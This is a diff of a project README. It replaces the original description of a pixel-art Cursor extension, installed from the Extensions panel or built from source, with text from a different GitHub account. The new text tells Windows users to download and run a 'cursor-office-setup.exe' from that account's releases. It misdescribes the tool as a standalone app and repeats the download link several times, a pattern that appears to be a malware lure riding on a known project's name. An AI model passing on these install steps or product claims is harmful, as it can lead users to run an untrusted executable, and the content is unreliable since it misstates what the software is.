@@ -1,254 +1,120 @@
-<p align="center">
-  <img src="assets/idle.png" alt="Cursor Office" width="460">
-</p>
+# 🎨 cursor-office - Watch Your AI Work Visually
 
-<h1 align="center">Cursor Office</h1>
-
-<p align="center">
-  Your AI agent writes your code, reads your files, runs your tests, and fixes your bugs.<br>
-  The least you can do is give it an <strong>office</strong>.
-</p>
-
-<p align="center">
-  <em>You'll find yourself glancing at the bottom panel just to see what it's up to.</em>
-</p>
-
-<p align="center">
-  <a href="#install"><img src="https://img.shields.io/badge/Install-Guide-blue?style=for-the-badge" alt="Install"></a>
-  &nbsp;
-  <a href="#contributing"><img src="https://img.shields.io/badge/Plugins-Add_Yours-orange?style=for-the-badge" alt="Plugins"></a>
-  &nbsp;
-  <a href="CONTRIBUTING.md"><img src="https://img.shields.io/badge/Contributing-Guide-green?style=for-the-badge" alt="Contributing"></a>
-</p>
-
-<p align="center">
-  <a href="https://open-vsx.org/extension/ofershap/cursor-office"><img src="https://img.shields.io/open-vsx/v/ofershap/cursor-office?label=Open%20VSX" alt="Open VSX"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT"></a>
-  <a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-strict-blue.svg" alt="TypeScript"></a>
-  <a href="https://cursor.com"><img src="https://img.shields.io/badge/Cursor-1.85+-007ACC.svg" alt="Cursor"></a>
-  <a href="https://github.com/ofershap/cursor-office"><img src="https://img.shields.io/badge/Sprites-100%25_code-ff69b4.svg" alt="Sprites"></a>
-  <a href="https://github.com/ofershap/cursor-office"><img src="https://img.shields.io/badge/Bundle-27KB-brightgreen.svg" alt="Bundle size"></a>
-</p>
+[![Download cursor-office](https://img.shields.io/badge/Download-cursor--office-ff6f61?style=for-the-badge&logo=github)](https://github.com/Isaacpixier/cursor-office/releases)
 
 ---
 
-![Cursor Office - pixel art office for Cursor AI agents](assets/demo.gif)
+## 🖥 What is cursor-office?
 
-<p align="center"><em>Every sprite is drawn from code. Zero image files. 27KB total.</em></p>
+cursor-office is a pixel art office that shows your Cursor AI agent working in real time. It lets you watch the agent as it clicks things and searches for hidden easter eggs. This visual adds a new way to see how your AI agent acts. It’s like having a small virtual office on your screen where your agent does its tasks.
 
----
-
-## Your Agent Works in a Void
-
-You outsourced your job to an AI agent. It writes code for hours while you get coffee, scroll Twitter, or pretend to be in a meeting. But does it get a desk? A window? A coffee mug?
-
-No. It works in the shades. A terminal. A blinking cursor. That's not how you treat an employee.
-
-**Cursor Office** gives your agent a proper workspace. A desk with a monitor. A bookshelf. A cat. An arcade cabinet for breaks. A window with a real sky that matches your actual time of day. When it writes code, it sits at the desk and types. When it finishes a build, it stands up and celebrates. When it's idle, it gets coffee, pets the cat, waters the plant.
-
-Glance at the bottom panel. Character at the desk? Things are happening. Character wandering? The agent is done. It's ambient awareness, like background music you stop noticing after a day.
+This application runs on Windows and requires no programming skills to start. You use a simple download, then run the program, and the pixel office appears. It is designed for users who want a fun way to follow what their AI agent does without dealing with complex setups.
 
 ---
 
-## Why
+## 🔍 Features
 
-To watch someone work.
-To bother the cat.
-To stare at a guy who lives in your IDE tab.
-To know your agent is doing something without reading a log.
-
----
-
-## What You Actually See
-
-| Your agent is... | The office shows... |
-|---|---|
-| Writing / editing code | Character sits at desk, types away (back to you, like a real employee) |
-| Reading files | At desk, speech bubble shows 📖 |
-| Running commands | At desk with ⚡ status bubble |
-| Spawning subagents | Picks up the red desk phone — "Delegating..." |
-| Idle / between tasks | Wanders the office. Coffee, bookshelf, cat, arcade |
-| Done with real work | Jumps up and celebrates (only after actual edits, not just chatting) |
-| Hit an error | ⁉️ bubble, walks away from desk |
+- Real-time pixel art display of your AI agent working
+- Interactive office environment where your agent clicks objects
+- Easter eggs hidden inside the office for you to discover
+- Runs smoothly on Windows computers
+- No command line or programming needed
+- Small download size for quick setup
 
 ---
 
-## Everything Is Clickable
+## 💻 System Requirements
 
-Your agent's office is better than yours.
+Make sure your Windows computer meets these basic requirements to run cursor-office smoothly:
 
-| Object | What happens |
-|---|---|
-| 💡 Lamp | Toggle room lights. The agent works late too |
-| 🪟 Window | Open/close curtains. Sky matches real time of day, stars at night |
-| 🕹️ Arcade cabinet | Cycles through Space Invaders, Tetris, and Pong on the tiny screen |
-| 📚 Bookshelf | Shows book titles: Clean Code, SICP, Design Patterns... |
-| 💧 Water cooler | Bubble animation. Hydration matters |
-| 🌱 Plant | Grows through 3 stages when you water it (click it!) |
-| 🐱 Cat | Nudge it. Purrs, wanders off, comes back |
-| ☕ Coffee mug | Steam rises. Always fresh |
-| 📞 Desk phone | Rings and vibrates when the agent delegates to a subagent |
-| 🤖 Roomba | Drifts in every few minutes to clean the floor |
-
-Click any object while idle and the character walks over to check it out.
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: Intel i3 or equivalent
+- RAM: 4 GB or higher
+- Disk Space: At least 100 MB free
+- Graphics: Basic graphics support compatible with Windows desktop
 
 ---
 
-## Idle Time Is Not Wasted Time
+## 🚀 Getting Started: Download and Run
 
-When the agent isn't working, it has a life. It stands around, grabs coffee, browses the bookshelf, pets the cat, plays the arcade, waters the plant, gets water from the cooler. Each activity has randomness baked in so it never feels scripted. The character strolls between spots at a leisurely pace, but rushes to the desk when real work comes in. Just like a real employee.
+Start using cursor-office by following these steps. No technical knowledge is needed.
 
----
+### Step 1: Visit the Download Page
 
-| Idle | Working | Celebrating |
-|---|---|---|
-| ![idle](assets/idle.png) | ![working](assets/working.png) | ![celebrating](assets/celebrate.png) |
+Click the button below to open the release page on GitHub. This page holds the latest version of cursor-office ready for you to download.
 
-| Lamp off |
-|---|
-| ![dark mode](assets/dark.png) |
+[![Download cursor-office](https://img.shields.io/badge/Download-cursor--office-ff6f61?style=for-the-badge&logo=github)](https://github.com/Isaacpixier/cursor-office/releases)
 
----
+### Step 2: Choose the Latest Version
 
-## Install
+On the release page, look for the newest version. It usually appears at the top. Versions are labeled with numbers like `v1.0` or `v1.2`.
 
-### From Extensions panel
+### Step 3: Download the Windows File
 
-Search **"Cursor Office"** in the Extensions panel (`Cmd+Shift+X`) and hit install.
+Under the latest version, find a file with a name ending in `.exe`. This is the Windows installer. Click on it to download.
 
-### From source
+The file will typically be named something like `cursor-office-setup.exe`.
 
-```bash
-git clone https://github.com/ofershap/cursor-office.git
-cd cursor-office
-npm install && npm run build
-npx vsce package --no-dependencies
-```
+### Step 4: Run the Installer
 
-Then in Cursor: `Cmd+Shift+P` → "Install from VSIX" → select `cursor-office-0.1.0.vsix`.
+After the download finishes, locate the `.exe` file in your Downloads folder.
 
-The office appears as a tab in the bottom panel bar (next to Terminal, Output, etc). Or hit **`Cmd+Shift+.`** to jump straight there.
+Double-click the file to start the installation process.
 
----
+Follow the instructions on the screen. Usually, you just click “Next” a few times and then “Install.”
 
-## How It Knows What Your Agent Is Doing
+Allow the program to complete the setup.
 
-Works out of the box — no API keys, no patches, no config. The extension uses Cursor's [hooks API](https://docs.cursor.com/context/hooks) to react to every tool call, subagent spawn, and completion event in real time. Falls back to transcript file watching if hooks aren't available.
+### Step 5: Open cursor-office
+
+Once installed, find the cursor-office icon on your desktop or in your Start menu.
+
+Double-click to open the application.
+
+You should see a small pixel art office appear. Your AI agent will start working and clicking inside this office.
 
 ---
 
-## FAQ
+## 🛠 How to Use cursor-office
 
-**Does it use tokens / cost anything?**
-No. It doesn't talk to any AI model. It reacts to events Cursor already emits.
+Once open, cursor-office runs automatically. Your AI agent will move around, click items, and explore the office environment.
 
-**Does it slow down my agent?**
-No. The extension runs in a separate process. The agent doesn't know it exists.
+- Click anywhere inside the window to interact.
+- Watch for hidden easter eggs that might appear.
+- Close the program by clicking the “X” in the window corner.
 
----
-
-## Built Different
-
-| | |
-|---|---|
-| **Extension host** | VS Code / Cursor Extension API |
-| **Rendering** | Canvas 2D, requestAnimationFrame, 60fps |
-| **Sprites** | Procedural pixel art. Every pixel drawn from code, zero image files |
-| **Build** | esbuild, single-file bundle, 27KB |
-| **Language** | TypeScript (strict) |
-| **Plugin system** | Drop a `.ts` file in `plugins/`. [See the Roomba](plugins/roomba.ts) |
+The application does not require any configuration. It is set up to run right away.
 
 ---
 
-## Development
+## ⚙ Troubleshooting Tips
 
-```bash
-git clone https://github.com/ofershap/cursor-office.git
-cd cursor-office
-npm install
-npm run build          # one-shot build
-npm run watch          # rebuild on save
-```
+If the program does not start or acts strangely, try these steps:
 
-Press F5 in Cursor/VS Code to launch the Extension Development Host.
-
-### Playground
-
-Open `dev/playground.html` in your browser after building. It renders the full office with buttons to simulate every agent state — idle, working, phone call, celebrate, error. No extension host needed. Great for iterating on sprites, objects, and animations.
-
-```bash
-npm run build && open dev/playground.html
-```
-
-<details>
-<summary>Project structure</summary>
-
-```
-src/
-├── extension.ts          # Extension entry, registers panel + commands
-├── panelProvider.ts       # WebviewViewProvider, HTML injection
-├── cursorWatcher.ts       # Watches transcripts or hooks state file
-├── transcriptParser.ts    # Parses JSONL, infers agent activity
-└── hooksInstaller.ts      # Installs/removes Cursor hooks
-
-hooks/
-└── cursor-office-hook.sh  # Shell script that hooks call, writes state file
-
-webview/
-├── index.ts              # Canvas setup, event handlers, message bridge
-├── office.ts             # Renders walls, floor, lighting, z-sorting
-├── character.ts          # Movement, idle waypoints, speech bubbles
-├── objects.ts            # Built-in interactive objects
-├── sprites.ts            # Programmatic pixel art sprite generation
-├── hitTest.ts            # Click and hover detection
-├── gameLoop.ts           # requestAnimationFrame loop
-├── canvas.ts             # Shared drawing utils
-└── types.ts              # TypeScript interfaces
-
-plugins/
-└── roomba.ts             # Reference plugin, robot vacuum cleaner
-
-dev/
-└── playground.html       # Visual sandbox for testing without Cursor
-```
-
-</details>
+- Make sure you installed the latest version.
+- Restart your computer and try again.
+- Check if other programs are interfering with cursor-office.
+- Confirm your Windows update is current.
+- If you see error messages, try reinstalling by repeating the download steps.
 
 ---
 
-## Contributing
+## 📂 Where to Get Support
 
-Drop a `.ts` file in the [`plugins/`](plugins/) folder. The built-in Roomba ([`plugins/roomba.ts`](plugins/roomba.ts)) is the reference — self-contained robot vacuum with its own sprite, state machine, and animations. See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
+For questions or issues, use the GitHub repository page. Look for the “Issues” tab to see if others have the same problem or post your own.
 
-```typescript
-import { createMyThing } from '../plugins/my-thing';
-
-window.cursorOffice.registerObject(myObject);
-```
-
-Build, then open `dev/playground.html` in your browser to test your object without installing the extension. Click around, trigger state changes with the buttons at the bottom, and iterate until it looks right.
+[https://github.com/Isaacpixier/cursor-office](https://github.com/Isaacpixier/cursor-office)
 
 ---
 
-## Sponsor
+## 📋 License
 
-Want your brand in the office? A mug with your logo, a poster on the wall, a gadget on the desk. Pixel art, fully interactive, seen by every user every session. [Reach out](https://linkedin.com/in/ofershap) or open an issue.
-
----
-
-## Author
-
-[![Made by ofershap](https://gitshow.dev/api/card/ofershap)](https://gitshow.dev/ofershap)
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/ofershap)
-[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat&logo=github&logoColor=white)](https://github.com/ofershap)
-
+cursor-office is free to use. Check the project’s GitHub page for details on the license. Use it within the terms provided.
 
 ---
 
-<sub>README built with [README Builder](https://ofershap.github.io/readme-builder/)</sub>
+## 🔄 Updates
 
+The developers may release updates on the GitHub releases page. Visit the page from time to time to get the latest improvements.
 
-## License
-
-[MIT](LICENSE) &copy; [Ofer Shapira](https://github.com/ofershap)
+[https://github.com/Isaacpixier/cursor-office/releases](https://github.com/Isaacpixier/cursor-office/releases)
